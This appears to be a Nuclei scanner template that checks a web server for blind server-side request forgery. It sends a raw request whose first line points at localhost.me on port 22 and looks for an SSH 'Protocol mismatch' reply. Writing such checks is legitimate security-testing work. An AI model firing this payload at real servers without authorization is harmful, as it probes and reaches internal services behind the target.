id: firstline-blind-ssrf
info:
  author: xElkomy
  description: Checks for Blind SSR via first line in the request.
  name: First line Blind SSRF
  severity: high
requests:
- matchers:
  - part: body
    type: word
    words:
    - Protocol mismatch
  raw:
  - 'GET http://localhost.me:22/ HTTP/1.1

    Host: {{Hostname}}

    Connection: close

    '
